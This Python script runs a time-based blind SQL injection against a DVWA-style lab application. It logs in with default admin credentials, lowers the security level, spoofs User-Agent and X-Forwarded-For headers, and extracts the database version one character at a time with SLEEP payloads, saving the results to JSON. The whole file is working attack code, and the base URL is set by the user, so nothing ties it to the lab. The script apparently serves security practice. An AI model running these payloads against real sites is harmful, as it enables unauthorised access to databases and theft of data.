from bs4 import BeautifulSoup
import requests
from datetime import datetime
from pathlib import Path
import sys
import json
import os
import time

# Configuração inicial
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

if len(sys.argv) > 2:
    base_url = sys.argv[1]
    request_rate = sys.argv[2]
else:
    print("Base URL was not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 10, 'medium': 5, 'high': 3}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

sqli_blind_url = f"{base_url}/vulnerabilities/sqli_blind/"

# Headers to spoof User-Agent and IP address
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'X-Forwarded-For': '192.168.1.1'
}

# Construct the target URL for brute force attacks
target_url = f"{base_url}/vulnerabilities/brute/"
login_url = f"{base_url}/login.php"
security_url = f"{base_url}/security.php"

def login_and_setup_security():
    login_response = session.get(login_url)  
    soup = BeautifulSoup(login_response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None

    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': user_token  
    }
    login_response = session.post(login_url, data=login_data, headers=headers)
    
    
    if 'PHPSESSID' in session.cookies:
        print("Login successful, PHPSESSID:", session.cookies['PHPSESSID'])
    else:
        print("Login failed")
        return

    
    security_response = session.get(security_url)
    soup = BeautifulSoup(security_response.text, 'html.parser')
    security_token = soup.find('input', {'name': 'user_token'}).get('value')
    security_data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': security_token
    }
    session.post(security_url, data=security_data, headers=headers)
    
def blind_sql_injection_attack():
    total_tests = 0
    tests_passed = 0
    tests_failed = 0
    details = []
    version_number = ''
    version_length = 5  # Assumption of version string length for testing

    # Loop to try to extract each character of the database version
    for i in range(1, version_length + 1):
        found = False
        for ascii_code in range(32, 127):
            # Payload that causes conditional delay based on the ASCII value of the character
            payload = f"' AND IF(ASCII(SUBSTRING((SELECT version()),{i},1))={ascii_code}, SLEEP(5), false)-- "
            start_time = time.time()
            response = session.get(sqli_blind_url, params={'id': payload}, headers=headers)
            elapsed_time = time.time() - start_time
            total_tests += 1

            # Assumes that a response time greater than 4 seconds is a successful test
            if elapsed_time > 4:
                version_number += chr(ascii_code)
                tests_passed += 1
                found = True
                details.append({
                    "position": i,
                    "character": chr(ascii_code),
                    "payload": payload,
                    "elapsed_time": elapsed_time,
                    "status_code": response.status_code,
                    "result": "PASSED"
                })
                print(f"Character found: {chr(ascii_code)} at position {i}")
                break
            else:
                details.append({
                    "position": i,
                    "character": chr(ascii_code),
                    "payload": payload,
                    "elapsed_time": elapsed_time,
                    "status_code": response.status_code,
                    "result": "FAILED"
                })
            time.sleep(delay)  # Delay between each request to avoid rate limiting

        if not found:
            print(f"No character found at position {i}, stopping.")
            break

    # Log results
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': sqli_blind_url,
        'details': details
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    login_and_setup_security()
    blind_sql_injection_attack()